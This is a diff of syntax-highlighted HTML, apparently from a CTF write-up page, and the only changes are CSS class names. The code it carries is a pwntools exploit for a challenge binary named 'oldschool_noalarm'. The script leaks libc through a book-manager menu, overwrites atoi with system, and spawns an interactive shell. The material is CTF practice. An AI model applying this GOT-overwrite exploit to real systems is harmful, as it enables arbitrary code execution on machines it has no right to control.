@@ -361,33 +361,33 @@ Description: AAAA�N���
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./oldschool_noalarm"</span>
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc6_2.23-0ubuntu7_amd64.so"</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
 </span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
 </span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">add_book</span><span class="p">(</span><span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">dlen</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"uthor:"</span><span class="p">,</span> <span class="n">author</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">dlen</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"uthor:"</span><span class="p">,</span> <span class="n">author</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">dlen</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">edit_book</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">desc</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"uthor:"</span><span class="p">,</span> <span class="n">author</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"uthor:"</span><span class="p">,</span> <span class="n">author</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">del_book</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">show_book</span><span class="p">():</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"4"</span><span class="p">)</span>
 
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -399,9 +399,9 @@ Description: AAAA�N���
     <span class="n">show_book</span><span class="p">()</span>
     
     <span class="c1"># leak libc
-</span>    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
-    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAAA"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'atoi'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
 
     <span class="n">del_book</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
     <span class="n">book</span><span class="p">,</span> <span class="n">author</span> <span class="o">=</span> <span class="s">"1"</span><span class="o">*</span><span class="mi">32</span><span class="p">,</span> <span class="s">"a"</span><span class="o">*</span><span class="mi">32</span>  
@@ -416,17 +416,17 @@ Description: AAAA�N���
     <span class="n">edit_book</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"1</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 
     <span class="c1"># overwrite atoi to system
-</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
     <span class="n">book</span><span class="p">,</span> <span class="n">author</span><span class="p">,</span> <span class="n">desc</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400706</span><span class="p">)[:</span><span class="mi">6</span><span class="p">:]</span> <span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006f6</span><span class="p">)[:</span><span class="mi">6</span><span class="p">:],</span> <span class="n">payload</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Choice:"</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"name:"</span><span class="p">,</span> <span class="n">book</span><span class="p">)</span>
     <span class="c1"># don't know why author won't read input.....
 </span>    <span class="c1">#r.sendafter("uthor:", author)
-</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"tion:"</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
  
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
